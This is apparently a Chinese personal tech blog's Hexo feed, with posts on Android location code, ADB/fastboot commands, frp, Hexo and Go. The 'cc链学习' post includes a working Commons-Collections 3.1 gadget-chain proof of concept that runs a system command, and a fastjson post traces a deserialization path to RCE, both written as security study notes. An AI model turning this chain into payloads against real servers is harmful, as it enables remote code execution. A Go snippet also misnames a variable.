class="line">        mLocationClient.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    baidu sdk v7.2起的新调用接口，异步实现，这里我改了原作者的代码，因为虽然还能用但百度官方文档推荐使用此方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLocationListener</span> <span class="keyword">extends</span> <span class="title">BDAbstractLocationListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceiveLocation</span><span class="params">(BDLocation location)</span> </span>&#123;</span><br><span class="line"><span class="comment">//            在地图上显示位置</span></span><br><span class="line">            navigateTo(location);</span><br><span class="line"><span class="comment">//            runOnUiThread(new Runnable() &#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                @Override</span></span><br><span class="line"><span class="comment">//                public void run() &#123;</span></span><br><span class="line"><span class="comment">//                    StringBuilder currentPosition = new StringBuilder();</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;纬度：&quot;).append(location.getLatitude()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;经线：&quot;).append(location.getLongitude()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;国家：&quot;).append(location.getCountry()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;省：&quot;).append(location.getProvince()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;市：&quot;).append(location.getCity()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;区：&quot;).append(location.getDistrict()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;街道：&quot;).append(location.getStreet()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;定位方式：&quot;);</span></span><br><span class="line"><span class="comment">//                    if (location.getLocType() == BDLocation.TypeGpsLocation) &#123;</span></span><br><span class="line"><span class="comment">//                        currentPosition.append(&quot;GPS&quot;);</span></span><br><span class="line"><span class="comment">//                    &#125; else if (location.getLocType() ==</span></span><br><span class="line"><span class="comment">//                            BDLocation.TypeNetWorkLocation) &#123;</span></span><br><span class="line"><span class="comment">//                        currentPosition.append(&quot;网络&quot;);</span></span><br><span class="line"><span class="comment">//                    &#125;</span></span><br><span class="line"><span class="comment">//                    在显示地图的时候一定要注释下一句话，不然会因为找不到textView控件崩溃</span></span><br><span class="line"><span class="comment">//                    positionText.setText(currentPosition);</span></span><br><span class="line"><span class="comment">//                &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//            &#125;);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//        每五秒刷新会非常的耗电，所以在程序运行结束后停止定位</span></span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        mLocationClient.stop();</span><br><span class="line">        mapView.onDestroy();</span><br><span class="line">        baiduMap.setMyLocationEnabled(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>ctrl + o 快速重载</p>
<p>alt + insert　自动补全get,set方法</p>
<h3 id="adb-amp-fastboot-command"><a href="#adb-amp-fastboot-command" class="headerlink" title="adb &amp; fastboot command"></a>adb &amp; fastboot command</h3><h3 id="常用-ADB-命令"><a href="#常用-ADB-命令" class="headerlink" title="常用 ADB 命令"></a>常用 ADB 命令</h3><table>
<thead>
<tr>
<th>代码</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>adb reboot bootloader</td>
<td>在 bootloader 模式下重启</td>
</tr>
<tr>
<td>adb push</td>
<td>将文件从本地系统复制到 Android 手机的位置</td>
</tr>
<tr>
<td>adb pull</td>
<td>将文件从 Android 复制到您的系统</td>
</tr>
<tr>
<td>adb devices</td>
<td>显示所有连接的 adb 兼容设备</td>
</tr>
<tr>
<td>adb backup</td>
<td>备份 Android 设备</td>
</tr>
<tr>
<td>adb install</td>
<td>将应用程序从系统的 apk 文件位置安装到 Android 设备上</td>
</tr>
<tr>
<td>adb reboot</td>
<td>在正常模式下重新启动 Android 手机</td>
</tr>
<tr>
<td>adb connect</td>
<td>通过 WiFi 网络使用adb命令</td>
</tr>
<tr>
<td>adb shell screencap</td>
<td>获取设备的屏幕截图</td>
</tr>
</tbody></table>
<h3 id="常用-Fastboot-命令"><a href="#常用-Fastboot-命令" class="headerlink" title="常用 Fastboot 命令"></a>常用 Fastboot 命令</h3><table>
<thead>
<tr>
<th>代码</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>fastboot devices</td>
<td>显示连接的 Android 设备的序列号</td>
</tr>
<tr>
<td>fastboot oem unlock</td>
<td>解开 bootloader 锁（Android 5.0 及以下）</td>
</tr>
<tr>
<td>fastboot oem lock</td>
<td>恢复 bootloader 锁（Android 5.0 及以下）</td>
</tr>
<tr>
<td>fastboot flashing unlock</td>
<td>解开 bootloader 锁（Android 6.0 及以上）</td>
</tr>
<tr>
<td>fastboot flashing lock</td>
<td>恢复 bootloader 锁</td>
</tr>
<tr>
<td>fastboot flash recovery (filename)</td>
<td>在 bootloader 模式中向设备刷入文件</td>
</tr>
<tr>
<td>fastboot oem device-info</td>
<td>查看bootloader锁</td>
</tr>
</tbody></table>
<p><strong>fastboot刷写需要root权限</strong></p>
<p><strong>一般刷机直接根据厂商提供的shell脚本一把梭完事</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell pm list packages　　　　　　　　　//应用程序列表</span><br><span class="line">adb push [文件] /sdcard/Download　　　　　　//将文件推送到download目录</span><br><span class="line">pm uninstall -k --user 0 [package_name]　　//为用户卸载应用程序</span><br></pre></td></tr></table></figure>



<p>网络连接adb</p>
<p>adb connect 设备地址</p>
<p>刷第三方recovery</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">需要root权限</span></span><br><span class="line">fastboot flash recovery xxx.img</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb backup -f &lt;filename&gt; --twrp &lt;options&gt;</span><br><span class="line">&lt;filename&gt; 是备份数据文件名，如果不填则为默认名称 backup.ab；</span><br><span class="line">&lt;options&gt; 包含下列命令：</span><br><span class="line">--compress: 对备份文件进行压缩</span><br><span class="line">system: 备份根目录下 system 数据</span><br><span class="line">cache: 备份根目录下 cache 数据</span><br><span class="line">data: 备份根目录下 data 数据</span><br><span class="line">boot: 备份根目录下 boot 数据</span><br><span class="line">(其他分区同理)</span><br></pre></td></tr></table></figure>







<h4 id="避免在主线程发送http-请求修改ui"><a href="#避免在主线程发送http-请求修改ui" class="headerlink" title="避免在主线程发送http 请求修改ui"></a>避免在主线程发送http 请求修改ui</h4><p>启动一个子线程进行网路请求操作，然后再用Handler更新界面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    <span class="keyword">this</span>.setContentView(R.layout.share_mblog_view);</span><br><span class="line">    <span class="keyword">new</span> Thread(runnable).start();  <span class="comment">//启动子线程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//handler 处理返回的请求结果</span></span><br><span class="line">Handler handler = <span class="keyword">new</span> Handler()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.handleMessage(msg);</span><br><span class="line">        Bundle data = msg.getData();</span><br><span class="line">        String val = data.getString(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">         <span class="comment">// <span class="doctag">TODO:</span> 更新界面</span></span><br><span class="line">         <span class="comment">//</span></span><br><span class="line">        Log.i(<span class="string">&quot;mylog&quot;</span>,<span class="string">&quot;请求结果--&gt;&quot;</span> + val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//新线程进行网络请求</span></span><br><span class="line">Runnable runnable = <span class="keyword">new</span> Runnable()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="comment">//</span></span><br><span class="line">         <span class="comment">// <span class="doctag">TODO:</span> http request.</span></span><br><span class="line">         <span class="comment">//</span></span><br><span class="line">        Message msg = <span class="keyword">new</span> Message();</span><br><span class="line">        Bundle data = <span class="keyword">new</span> Bundle();</span><br><span class="line">        data.putString(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;请求结果&quot;</span>);</span><br><span class="line">        msg.setData(data);</span><br><span class="line">        handler.sendMessage(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="android-9以上开启定位服务"><a href="#android-9以上开启定位服务" class="headerlink" title="android 9以上开启定位服务"></a>android 9以上开启定位服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Enable: </span><br><span class="line">adb shell settings put secure location_mode 3</span><br><span class="line">Disable: </span><br><span class="line">adb shell settings put secure location_mode 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">模拟滑动解锁</span></span><br><span class="line">adb shell input swipe 300 300 500 1000 100</span><br><span class="line"><span class="meta">#</span><span class="bash">输入密码</span></span><br><span class="line">adb  shell input text 1234</span><br><span class="line"><span class="meta">#</span><span class="bash">或者模拟输入</span></span><br><span class="line">input keyevent KEYCODE_5</span><br></pre></td></tr></table></figure>

<p>adb shell  调用autojs(root情况下)</p>
<p><code>am start -n org.autojs.autojs/.external.open.RunIntentActivity -d &quot;file:///storage/emulated/0/脚本/test.js&quot;</code></p>
<p>autojs 向tasker传值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//autojs文件test.js</span></span><br><span class="line">auto</span><br><span class="line"><span class="built_in">console</span>.show()</span><br><span class="line">app.sendBroadcast(&#123;</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&quot;autojs.intent.action.MAIN&quot;</span>,</span><br><span class="line">    <span class="attr">extras</span>: &#123;</span><br><span class="line">        <span class="attr">from</span>: <span class="string">&quot;Autoxjs&quot;</span>,</span><br><span class="line">        <span class="attr">version</span>: <span class="string">&quot;5.3.0&quot;</span>,</span><br><span class="line">        <span class="attr">info</span>:<span class="string">&quot;you get it&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>然后tasker中配置文件选择收到的意图，操作填<code>autojs.intent.action.MAIN</code>然后指向一个可以显示变量的控件，通过%from , %version , %info取出</p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>基础语法</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>cc链学习</title>
    <url>/2022/06/04/cc%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>commons-collections 组件反序列化调用链漏洞，简称cc链利用</p>
<span id="more"></span>

<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">commons_collections_3_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;gnome-calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ConstantTransformer这个类，给他什么对象他就返回什么对象</p>
<p>InvokerTransformer这个类的参数完全可控，可以通过反射构造rce</p>
<p>ChainedTransformer是Transformer的一个list，在函数内部进行了transfer函数的调用</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>这篇非常的友好，菜鸡如我也看懂的7788</p>
<p><a href="https://xz.aliyun.com/t/7031#toc-1">https://xz.aliyun.com/t/7031#toc-1</a></p>
<p><a href="https://www.cnblogs.com/bitterz/p/15035581.html">https://www.cnblogs.com/bitterz/p/15035581.html</a></p>
<p><a href="https://github.com/frohoff/ysoserial/tree/master">https://github.com/frohoff/ysoserial/tree/master</a></p>
<p><a href="https://xz.aliyun.com/t/9451#toc-19">https://xz.aliyun.com/t/9451#toc-19</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson1.2.22-1.2.24反序列化流程</title>
    <url>/2021/11/09/fastjson1-22-1-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接上一篇进行1.2.22-.1.2.24 fastjson源码漏洞的分析</p>
<span id="more"></span>

<h2 id="反序列化流程"><a href="#反序列化流程" class="headerlink" title="反序列化流程"></a>反序列化流程</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ser</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setName(<span class="string">&quot;harry&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">22</span>);</span><br><span class="line">        person.setGender(<span class="string">&quot;male&quot;</span>);</span><br><span class="line">        String jsonstring = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">        <span class="comment">//反序列化入口parseObject</span></span><br><span class="line">        System.out.println(JSON.parseObject(jsonstring));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反序列化入口,断点更进．</p>
<p>然后来到parseObject函数内部，位于<code>JSON.class</code> line 201</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636427219770-2021-11-911:06:59.png"></p>
<p>继续更进parseObject函数的parse函数　来到了line 128</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636427400491-2021-11-911:10:00.png"></p>
<p>然后跟进DefaultJsonParser函数进入<code>DefultJSONParser.class</code>，</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636427924973-2021-11-911:18:44.png"></p>
<p>触发了上面这个重载，来到下图line 175,函数的作用对输入的字符串第一个字符仅那个了判断并标记为常量值以判断类型</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636424111757-2021-11-910:15:11.png"></p>
<p>继续放行，这里是判断刚刚传导出来的类型即<code>&#123;</code>为12</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636423248501-2021-11-910:00:48.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636424290738-2021-11-910:18:10.png"></p>
<p>继续放行来到了line 322这个if块，这里是得到我们传入类的类名</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636424779575-2021-11-910:26:19.png"></p>
<p>step over来到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//载入类   </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="comment">//判断传入类</span></span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (classLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                clazz = classLoader.loadClass(className);</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="comment">//如果类不是内置类型，那就载入用户传入的类</span></span><br><span class="line">            <span class="keyword">if</span> (contextClassLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                clazz = contextClassLoader.loadClass(className);</span><br><span class="line">          </span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = Class.forName(className);</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636425593359-2021-11-910:39:53.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636425649245-2021-11-910:40:49.png"></p>
<p>载入前后的mappings的变化．自定义的类被载入进来了</p>
<p>step in 这个getDeserializer函数，跳入<code>ParserConfig.class</code>有一个黑名单过滤,黑名单中只对<code>java.lang.Thread</code>进行了限制，其他类均可以载入．</p>
<p>至此<code>java.lang.Runtime</code>被正常载入，就可以通过这个类进行RCE,在程序调用反序列化的函数<code>parseObject</code>的时候就会执行</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636425819753-2021-11-910:43:39.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636426480234-2021-11-910:54:40.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>frp的token does note match问题</title>
    <url>/2021/11/20/frp%E7%9A%84token-does-note-match%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>今天新拉了一个frp的版本装在腾讯云的小鸡上，然后测试了一下发现咋配置都不能使token两边匹配</p>
<p>疯狂给我报这个错误</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637391097972-2021-11-2014:51:37.png" alt="服务端"></p>
<blockquote>
<p>register control error: token in login doesn’t match token from configuration</p>
</blockquote>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637391142808-2021-11-2014:52:22.png" alt="客户端"></p>
<blockquote>
<p>login to server failed: token in login doesn’t match token from configuration token in login doesn’t match token from configuration</p>
</blockquote>
<p>然后我懵了，百思的不得其解，盯着token看了好几遍完全一样啊</p>
<span id="more"></span>

<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>搜中文搜了半天没答案，</p>
<p>直接把报错信息贴进google，oooooh f**K</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637391308907-2021-11-2014:55:08.png"></p>
<p>我在官方的issue去找到了问题的所在，</p>
<p>我的启动命令都是</p>
<p><code>./frp[s/c]</code>直接默认配置启动的</p>
<p><strong>而frpc会使用<code>frpc.ini</code>作为默认的配置文件</strong></p>
<p><strong>而frps不会把<code>frps.ini</code>作为默认的配置文件</strong></p>
<p>我人傻了，之前用的版本没遇到过这个问题</p>
<p>记录一下</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>知道了原因，解决方法就很简单了</p>
<p>启动的时候全部加上配置文件呗</p>
<p>客户端(主要是服务端要改，客户端直接启动没问题)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>

<p>服务端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./frps -s frps.ini</span><br></pre></td></tr></table></figure>



<p>终于正常了..</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637391616818-2021-11-2015:00:16.png"></p>
]]></content>
      <tags>
        <tag>踩坑</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo写作</title>
    <url>/2021/11/05/hexo%E5%86%99%E4%BD%9C/</url>
    <content><![CDATA[<p>换了个主题还是用了next,还行吧，先用着</p>
<p><strong>tips:</strong></p>
<pre><code> 1.  首先`&lt;!-- more --&gt;`可以用来在主页隐藏剩下篇幅，展示&quot;read more&quot;
</code></pre>
<h2 id="hexo创建文章"><a href="#hexo创建文章" class="headerlink" title="hexo创建文章"></a>hexo创建文章</h2><p>然后记录一下hexo写blog的方式:</p>
<ol>
<li><p>创建新文章</p>
<p><code>hexo new aritle &#39;your_aritle_name&#39; </code> 然后就是用md格式写blog</p>
</li>
<li><p>创建新页面</p>
<p><code>hexo new page your_page_name</code></p>
<p>然后可以去<code>$(blog_root)/themes/next/_config.yml</code> menu下面开启(新增)这个新建的页面，本质依旧是markdown文档</p>
</li>
<li><p>categories &amp; tags</p>
<p>区别categories可以嵌套使用，tags是平级的存在</p>
<ul>
<li>foo的下级目录是bar</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">foo</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">bar</span></span><br></pre></td></tr></table></figure>

<ul>
<li>foo,bar是平级的tag</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">foo</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">bar</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="使用评论系统-Disqus"><a href="#使用评论系统-Disqus" class="headerlink" title="使用评论系统 Disqus"></a>使用评论系统 Disqus</h2><p><a href="https://guanqr.com/tech/website/hexo-theme-next-comments/">参考文章</a></p>
<ol>
<li>注册disqus,这里我选的是直接用google帐号登录</li>
<li>获取到shortname之后填入<code>$(blog_root)/themes/next/_config.yml</code><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636100640951-2021-11-516:24:00.png"></li>
<li>然后重新部署下就行</li>
</ol>
<p><strong>需要注意的是比如页面不希望出现评论可以在font-matter中</strong><code>comments: false</code></p>
]]></content>
      <categories>
        <category>折腾hexo</category>
      </categories>
  </entry>
  <entry>
    <title>GO语法笔记</title>
    <url>/2021/11/06/go/</url>
    <content><![CDATA[<h1 id="go语法笔记"><a href="#go语法笔记" class="headerlink" title="go语法笔记"></a>go语法笔记</h1><span id="more"></span>

<ul>
<li><p>hello world</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> firstname <span class="keyword">string</span></span><br><span class="line">    fmt.Scanln(&amp;firstName)</span><br><span class="line">	fmt.Println(firstName)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Println的p需要大写</span></span><br><span class="line"><span class="comment">//命令行运行go run 文件名</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><code>println</code> is an built-in function (into the runtime) which may eventually be removed, while the <code>fmt</code> package is in the standard library, which will persist. See <a href="http://golang.org/ref/spec#Bootstrapping">the spec</a> on that topic.</p>
<p>For language developers it is handy to have a <code>println</code> without dependencies, but the way to go is to use the <code>fmt</code> package or something similar (<code>log</code> for example).</p>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul>
<li><p>定义变量</p>
